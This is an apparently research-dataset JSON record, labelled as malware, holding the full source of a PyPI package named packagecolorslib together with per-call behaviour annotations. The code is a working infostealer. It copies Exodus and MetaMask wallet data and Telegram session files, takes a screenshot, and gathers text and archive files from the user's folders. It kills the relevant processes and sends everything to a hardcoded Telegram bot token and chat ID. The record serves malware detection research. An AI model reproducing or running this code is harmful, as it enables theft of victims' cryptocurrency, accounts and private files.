{
  "metadata": {
    "package_name": "packagecolorslib-1.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/packagecolorslib-1.0.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/packagecolorslib-1.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "packagecolorslib.py",
      "code_snippets": [
        {
          "snippet": "import httpx\nimport shutil\nimport psutil\nimport os.path\nimport getpass\nimport zipfile\nimport tempfile\nimport requests\nimport pycountry\nfrom PIL import ImageGrab\n\nclient: str = os.path.expanduser(\"~\")\nsource_dir = client + \"\\\\AppData\\\\Roaming\\\\Exodus\"\ndest_dir = client + \"\\\\AppData\\\\Local\\\\Temp\\\\Exodus\"\ntelegram_dir = client + \"\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\tdata\"\n\nTELEGRAM_TOKEN = '6087608665:AAGw1OrKSuemG0PfBR6Uxxol82JyUQxclGA'\nTELEGRAM_CHAT_ID = '-1001847768598'\n\nusername = getpass.getuser()\nip_address = requests.get('https://api.ipify.org').text\n\nresponse = requests.get(f'http://ip-api.com/json/{ip_address}')\ncountry_code = response.json().get('countryCode', '')\ncountry = pycountry.countries.get(alpha_2=country_code)\nisp = response.json().get('isp', '')\n\nhas_exodus = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Exodus'))\nhas_ledger = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Ledger Live'))\nhas_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))\n\ndef has_metamask() -> bool:\n    metamask_path = os.path.join(client, \"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\")\n    return os.path.exists(metamask_path)\n\ndef kill_metamask_processes():\n    for process in psutil.process_iter():\n        try:\n            process_info = process.as_dict(attrs=['pid', 'name', 'exe', 'cmdline'])\n            process_name = process_info['name'].lower()\n            process_exe = process_info['exe']\n            process_cmdline = process_info['cmdline']\n\n            if 'metamask' in process_name or (process_exe and 'metamask' in process_exe) or (process_cmdline and 'metamask' in ' '.join(process_cmdline)):\n                process.terminate()\n                process.wait()\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n\ndef zip_metamask_files() -> list:\n    meta_paths = [\n        [f\"{client}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\", \"Edge\"],\n        [f\"{client}\\\\AppData\\\\Local\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\", \"Brave\"],\n        [f\"{client}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\", \"Google\"],\n        [f\"{client}\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera GX Stable\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\", \"OperaGX\"]\n    ]\n    zipped_files = []\n    for meta_path, browser in meta_paths:\n        if os.path.exists(meta_path):\n            dest_metamask = os.path.join(client, f\"\\\\AppData\\\\Local\\\\Temp\\\\Metamask_{browser}\")\n            dest_metamask_zip = os.path.join(client, f\"\\\\AppData\\\\Local\\\\Temp\\\\Metamask_{browser}.zip\")\n            if os.path.exists(dest_metamask):\n                shutil.rmtree(dest_metamask)\n            kill_metamask_processes()\n            try:\n                shutil.copytree(meta_path, dest_metamask)\n            except shutil.Error as e:\n                for src, dest, error in e.args[0]:\n                    if '[Errno 13] Permission denied' in str(error):\n                        pass\n                    else:\n                        raise\n            shutil.make_archive(dest_metamask, \"zip\", dest_metamask)\n            shutil.rmtree(dest_metamask)\n            zipped_files.append(dest_metamask_zip)\n    return zipped_files\n\ndef path_exists() -> bool:\n    if os.path.exists(client + \"\\\\AppData\\\\Roaming\\\\Exodus\"):\n        return True\n    else:\n        return False\n\ndef zip_files() -> bool:\n    try:\n        if os.path.exists(dest_dir):\n            shutil.rmtree(dest_dir)\n        shutil.copytree(source_dir, dest_dir)\n        shutil.make_archive(dest_dir, \"zip\", dest_dir)\n        return True\n    except:\n        return False\n\ndef remove_files() -> bool:\n    try:\n        os.remove(client + \"\\\\AppData\\\\Local\\\\Temp\\\\Exodus.zip\")\n        os.remove(client + \"\\\\AppData\\\\Local\\\\Temp\\\\Exodus\")\n        return True\n    except:\n        return False\n\ndef send_file_telegram(file_path: str) -> bool:\n    try:\n        with open(file_path, \"rb\") as exodus_zip:\n            data = {\n                'chat_id': TELEGRAM_CHAT_ID,\n                'caption': \"ùóòùó´ùó¢ùóóùó®ùó¶\"\n            }\n            files = {\n                'document': ('Exodus.zip', exodus_zip)\n            }\n            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)\n        if response.status_code == 200:\n            return True\n        else:\n            return False\n    except:\n        return False\n\ndef send_screenshot_telegram() -> bool:\n    try:\n        screenshot = ImageGrab.grab()\n        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:\n            screenshot.save(f.name)\n            file_name = f.name\n        with open(file_name, 'rb') as photo:\n            files = {'photo': photo}\n            url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'\n            params = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'üÖ•üÖòüÖíüÖ£üÖòüÖúüÖî   üÖ¢üÖ£üÖîüÖêüÖõüÖîüÖì \\n\\n‚ñ∫ ùó®ùóßùóúùóüùóúùó¶ùóîùóßùóòùó®ùó• : {username}\\n‚ñ∫ ùó£ùóîùó¨ùó¶ : {country.name if country else \"\"}\\n‚ñ∫ ùóúùó£ ùóîùóóùó•ùóòùó¶ùó¶ùóò : {ip_address}\\n‚ñ∫ ùóúùó¶ùó£ : {isp} \\n\\n‚ñ∫ ùóßùóòùóüùóòùóöùó•ùóîùó† {\"‚úÖ\" if has_telegram else \"‚ùå\"}\\n‚ñ∫ ùóüùóòùóóùóöùóòùó• : {\"‚úÖ\" if has_ledger else \"‚ùå\"}\\n‚ñ∫ ùó†ùóòùóßùóîùó†ùóîùó¶ùóû : {\"‚úÖ\" if has_metamask else \"‚ùå\"}\\n‚ñ∫ ùóòùó´ùó¢ùóóùó®ùó¶ : {\"‚úÖ\" if has_exodus else \"‚ùå\"}'}\n            response = httpx.post(url, files=files, data=params)\n            if response.status_code != 200:\n                return False\n            else:\n                return True\n    except:\n        return False\n\ndef send_metamask_file_telegram(file_paths: list) -> bool:\n    try:\n        sent_successfully = True\n        for file_path in file_paths:\n            with open(file_path, \"rb\") as metamask_zip:\n                data = {\n                    'chat_id': TELEGRAM_CHAT_ID,\n                    'caption': \"ùó†ùóòùóßùóîùó†ùóîùó¶ùóû\"\n                }\n                files = {\n                    'document': ('Metamask.zip', metamask_zip)\n                }\n                response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)\n            if response.status_code != 200:\n                sent_successfully = False\n            os.remove(file_path)\n        return sent_successfully\n    except:\n        return False\n\ndef send_telegram_session():\n    session_folder_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')\n    script_parent_folder = os.path.dirname(os.path.abspath(__file__))\n    for proc in psutil.process_iter(['name']):\n        if proc.info['name'] == 'Telegram.exe':\n            pid = proc.pid\n            os.kill(pid, 9)\n    with tempfile.NamedTemporaryFile(suffix='.zip', delete=False, dir=script_parent_folder) as f:\n        zip_filename = f.name\n    if not os.path.exists(session_folder_path):\n        return False\n    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zip_file:\n        for root, dirs, files in os.walk(session_folder_path):\n            for file in files:\n                zip_file.write(os.path.join(root, file))\n    if not os.path.exists(zip_filename):\n        return False\n    try:\n        with open(zip_filename, \"rb\") as session_zip:\n            data = {\n                'chat_id': TELEGRAM_CHAT_ID,\n                'caption': \"ùóßùóòùóüùóòùóöùó•ùóîùó† ùó¶ùóòùó¶ùó¶ùóúùó¢ùó°\"\n            }\n            files = {\n                'document': ('session.zip', session_zip)\n            }\n            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)\n        if response.status_code == 200:\n            os.remove(zip_filename)\n            return True\n        else:\n            os.remove(zip_filename)\n            return False\n    except Exception as e:\n        os.remove(zip_filename)\n        return False\n\ndef send_txtfiles_telegram() -> bool:\n    try:\n        txt_file_count = 0 \n        with zipfile.ZipFile(\"Fichiers_TXT.zip\", \"w\", zipfile.ZIP_DEFLATED) as zip_file:\n            for folder in ['Desktop', 'Documents']:\n                for root, dirs, files in os.walk(os.path.join(os.path.expanduser(\"~\"), folder)):\n                    for file in files:\n                        if file.endswith(\".txt\"):\n                            txt_file_count += 1\n                            zip_file.write(os.path.join(root, file))\n        with open(\"Fichiers_TXT.zip\", \"rb\") as txt_zip:\n            data = {\n                'chat_id': TELEGRAM_CHAT_ID,\n                'caption': f\"ùóôùóúùóñùóõùóúùóòùó•ùó¶ : {txt_file_count} \"\n            }\n            files = {\n                'document': ('Fichiers_TXT.zip', txt_zip)\n            }\n            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)\n        if response.status_code == 200:\n            return True\n        else:\n            return False\n    except:\n        return False\n\ndef send_compressed_files_telegram() -> bool:\n    try:\n        compressed_file_count = 0\n        with zipfile.ZipFile(\"Fichiers_Comprimes.zip\", \"w\", zipfile.ZIP_DEFLATED) as zip_file:\n            for folder in ['Desktop', 'Documents']:\n                for root, dirs, files in os.walk(os.path.join(os.path.expanduser(\"~\"), folder)):\n                    for file in files:\n                        if file.endswith(\".zip\") or file.endswith(\".rar\"):\n                            compressed_file_count += 1\n                            zip_file.write(os.path.join(root, file))\n        with open(\"Fichiers_Comprimes.zip\", \"rb\") as compressed_zip:\n            data = {\n                'chat_id': TELEGRAM_CHAT_ID,\n                'caption': f\"ùóóùó¢ùó¶ùó¶ùóúùóòùó•ùó¶ :  : {compressed_file_count}\"\n            }\n            files = {\n                'document': ('Fichiers_Comprimes.zip', compressed_zip)\n            }\n            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)\n        if response.status_code == 200:\n            return True\n        else:\n            return False\n    except:\n        return False\n\ndef packagecolorslib():\n    if path_exists() == True:\n        if zip_files() == True:\n            screenshot_sent = send_screenshot_telegram()\n            exodus_sent = send_file_telegram(client + \"\\\\AppData\\\\Local\\\\Temp\\\\Exodus.zip\")\n            metamask_zips = zip_metamask_files()\n            metamask_sent = send_metamask_file_telegram(metamask_zips)\n            if has_telegram:\n                telegram_session_sent = send_telegram_session()\n            else:\n                telegram_session_sent = True\n            txt_files_sent = send_txtfiles_telegram()\n            compressed_files_sent = send_compressed_files_telegram()\n            if screenshot_sent and exodus_sent and (not has_telegram or telegram_session_sent) and metamask_sent and txt_files_sent and compressed_files_sent:\n                exit(code=None)\n            else:\n                exit(code=None)\n        else:\n            exit(code=None)\n    else:\n        exit(code=None)\n\nif __name__ == \"__main__\":\n    packagecolorslib()\n",
          "triple_sequences": [
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "~",
              "object_description": "Home directory path",
              "object_id": "home_directory_path",
              "intention_description": "Get user home directory",
              "intention_id": "get_user_home_directory"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://api.ipify.org",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'http://ip-api.com/json/{ip_address}'",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "response.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "pycountry.countries.get()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "alpha_2=country_code",
              "object_description": "Country code",
              "object_id": "country_code",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.join(os.getenv('APPDATA'), 'Exodus')",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.join(os.getenv('APPDATA'), 'Ledger Live')",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.join(client, \"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\")",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "psutil.Process.as_dict()",
              "action_description": "Retrieves process information",
              "action_id": "get_process_info",
              "object": "attrs=['pid', 'name', 'exe', 'cmdline']",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "psutil.Process.terminate()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "psutil.Process.wait()",
              "action_description": "Waits for process to complete execution",
              "action_id": "wait_process_completion",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "dest_metamask",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "shutil.copytree()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "meta_path, dest_metamask",
              "object_description": "Directory path and temporary directory",
              "object_id": "directory_path_with_temp",
              "intention_description": "Copy file to temporary directory",
              "intention_id": "copy_file_temp_directory"
            },
            {
              "action_api": "shutil.make_archive()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "dest_metamask, \"zip\", dest_metamask",
              "object_description": "Directory path and temporary directory",
              "object_id": "directory_path_with_temp",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "dest_metamask",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "client + \"\\AppData\\Roaming\\Exodus\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "dest_dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "shutil.copytree()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "source_dir, dest_dir",
              "object_description": "Directory path and temporary directory",
              "object_id": "directory_path_with_temp",
              "intention_description": "Copy file to temporary directory",
              "intention_id": "copy_file_temp_directory"
            },
            {
              "action_api": "shutil.make_archive()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "dest_dir, \"zip\", dest_dir",
              "object_description": "Directory path and temporary directory",
              "object_id": "directory_path_with_temp",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "client + \"\\AppData\\Local\\Temp\\Exodus.zip\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "client + \"\\AppData\\Local\\Temp\\Exodus\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_path, \"rb\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files",
              "object_description": "Telegram API endpoint",
              "object_id": "telegram_api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "",
              "object_description": "Screen region",
              "object_id": "screen_region",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "tempfile.NamedTemporaryFile()",
              "action_description": "Creates temporary file that is not deleted on close",
              "action_id": "create_temp_file",
              "object": "suffix='.png', delete=False",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Create temporary file",
              "intention_id": "create_temporary_file"
            },
            {
              "action_api": "screenshot.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "f.name",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_name, 'rb'",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Read screenshot file content",
              "intention_id": "read_screenshot_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "url, files=files, data=params",
              "object_description": "Telegram API endpoint",
              "object_id": "telegram_api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_path, \"rb\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files",
              "object_description": "Telegram API endpoint",
              "object_id": "telegram_api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "file_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "['name']",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "os.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "pid, 9",
              "object_description": "Process ID",
              "object_id": "process_id",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "tempfile.NamedTemporaryFile()",
              "action_description": "Creates temporary file that is not deleted on close",
              "action_id": "create_temp_file",
              "object": "suffix='.zip', delete=False, dir=script_parent_folder",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Create temporary file",
              "intention_id": "create_temporary_file"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "session_folder_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "zip_filename, 'w', zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "session_folder_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "zip_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "os.path.join(root, file)",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Add file to archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "zip_filename",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "zip_filename, \"rb\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files",
              "object_description": "Telegram API endpoint",
              "object_id": "telegram_api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "zip_filename",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "\"Fichiers_TXT.zip\", \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "os.path.join(os.path.expanduser(\"~\"), folder)",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "zip_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "os.path.join(root, file)",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Add file to archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "\"Fichiers_TXT.zip\", \"rb\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files",
              "object_description": "Telegram API endpoint",
              "object_id": "telegram_api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "\"Fichiers_Comprimes.zip\", \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "os.path.join(os.path.expanduser(\"~\"), folder)",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "zip_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "os.path.join(root, file)",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Add file to archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "\"Fichiers_Comprimes.zip\", \"rb\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files",
              "object_description": "Telegram API endpoint",
              "object_id": "telegram_api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "code=None",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            }
          ]
        }
      ]
    }
  ]
}